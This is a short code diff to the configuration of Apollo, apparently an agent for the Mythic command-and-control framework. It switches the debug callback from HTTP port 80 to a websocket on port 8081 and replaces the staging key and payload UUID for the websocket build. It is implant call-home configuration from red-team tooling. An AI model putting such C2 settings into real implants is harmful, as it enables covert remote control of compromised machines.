@@ -80,9 +80,9 @@ namespace Apollo
 #if DEBUG
                         { "callback_interval", "5" },
                         { "callback_jitter", "0" },
-                        { "callback_port", "80" },
-                        { "callback_host", "http://mythic" },
-                        { "post_uri", "data" },
+                        { "callback_port", "8081" },
+                        { "callback_host", "ws://mythic" },
+                        { "post_uri", "socket" },
                         { "encrypted_exchange_check", "T" },
                         { "proxy_host", "" },
                         { "proxy_port", "" },
@@ -154,7 +154,7 @@ namespace Apollo
 #if HTTP
         public static string StagingRSAPrivateKey = "wO+CTvxcnsOclJ18n4rBilEc9NlhirkiITjwlWDaPRI=";
 #elif WEBSOCKET
-        public static string StagingRSAPrivateKey = "wO+CTvxcnsOclJ18n4rBilEc9NlhirkiITjwlWDaPRI=";
+        public static string StagingRSAPrivateKey = "c1R20l2Ga0VLgS1OHcXaiV/Eu40vLoWfQJuThzddAes=";
 #elif SMB
         public static string StagingRSAPrivateKey = "cnaJ2eDg1LVrR5LK/u6PkXuBjZxCnksWjy0vEFWsHIU=";
 #elif TCP
@@ -163,7 +163,7 @@ namespace Apollo
 #if HTTP
         public static string PayloadUUID = "89d28526-e957-4142-b0fe-b672b397179f";
 #elif WEBSOCKET
-        public static string PayloadUUID = "89d28526-e957-4142-b0fe-b672b397179f";
+        public static string PayloadUUID = "8034791f-6a9f-4d3c-98a1-e1ec6dce651a";
 #elif SMB
         public static string PayloadUUID = "869c4909-30eb-4a90-99b2-874dae07a0a8";
 #elif TCP
